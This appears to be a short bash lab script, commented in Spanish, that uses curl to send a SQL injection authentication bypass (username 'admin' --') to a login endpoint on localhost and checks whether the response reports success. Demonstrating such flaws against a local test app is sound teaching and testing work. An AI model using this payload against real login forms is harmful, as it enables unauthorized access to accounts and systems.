#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"; PORT="${PORT:-8050}"
echo "== Ataque: inyeccion SQL en el login (bypass de autenticacion) =="
curl -s -X POST "http://127.0.0.1:${PORT}/login" --data-urlencode "username=admin' --" --data-urlencode "password=x"; echo
echo "Si 'authenticated' es true sin el password => la inyeccion funciono."
